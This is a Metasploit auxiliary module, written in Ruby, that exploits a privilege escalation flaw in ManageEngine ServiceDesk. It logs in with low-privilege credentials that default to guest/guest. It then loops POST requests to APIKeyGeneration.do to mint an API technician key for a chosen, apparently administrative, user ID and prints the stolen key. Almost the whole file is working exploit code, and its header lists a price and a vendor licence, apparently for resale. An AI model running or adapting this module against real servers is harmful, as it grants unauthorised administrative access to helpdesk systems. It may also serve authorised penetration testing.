##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'ManageEngine ServiceDesk Privilege Escalation',
      'Description'    => %q{
    This module exploits a privilege escalation vulnerability in order
    to generate an administrator technician key used by the API.

    A longer description after the short description goes into more
    detail about the module, the vulnerbaility, or whatever information
    is useful to provide for documentation purposes.

    Categories: Open Source

    Price: 3

    Video: none

    OS: Multi

    Arch: Multi

    Requirements: Metasploit Framework
      },
      'References'     =>
        [
        ],
      'Author'         =>
        [
        ],
      'License'        => 'VolatileMinds',
      'DisclosureDate' => ''
    ))

    register_options(
      [
         Opt::RPORT(8080),
         OptString.new("TARGETURI", [true, 'The relative URI', '/']),
         OptString.new('USERNAME', [true, 'The username to authenticate with', 'guest']),
         OptString.new('PASSWORD', [true, 'The password to authenticate with', 'guest']),
         OptInt.new('USERID', [true, 'The user ID to generate an API key for', 2])
      ], self.class)
  end

  def run

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/')
    })

    cookie = res.get_cookies

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'j_security_check'),
      'vars_post' => {
        'j_username' => datastore['USERNAME'],
        'j_password' => datastore['PASSWORD'],
        'LDAPEnable' => false,
        #'hidden' => 'Select a Domain',
        'hidden' => 'For Domain',
        'AdEnable' => false,
        'DomainCount' => 0,
        'LocalAuth' => 'No',
        'LocalAuthWithDomain' => 'No',
        'dynamicUserAddition_status' => true,
        'localAuthEnable' => true,
        'logonDomainName' => -1
      },
      'cookie' => cookie
    })

    if res.code == 200
      fail_with(Failure::Unknown, 'Authentication failed')
    end

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/'),
      'cookie' => cookie
    })

    cookie = res.get_cookies

    i = 0
    token = ''
    while i < 10
      res = send_request_cgi({
        'uri' => normalize_uri(target_uri.path, 'APIKeyGeneration.do'),
        'method' => 'POST',
        'vars_post' => {
          'callfromurl' => 'personalize',
          'module' => 'generateAPIKey',
          'loginname' => '',
          'loginid' => datastore['USERID'],
          'expirytime' => -1
        },
        'cookie' => cookie
      })

      unless res.body =~ /Error while generating/
        token = $1 if res.body =~ /<MESSAGE>(.*)<\/MESSAGE>/
        break
      end
      i = i + 1
    end

    if token != ''
      print_good("Generated Technician Key: #{token}")
    else
      print_error("Unable to generate Technician key")
    end
  end
end

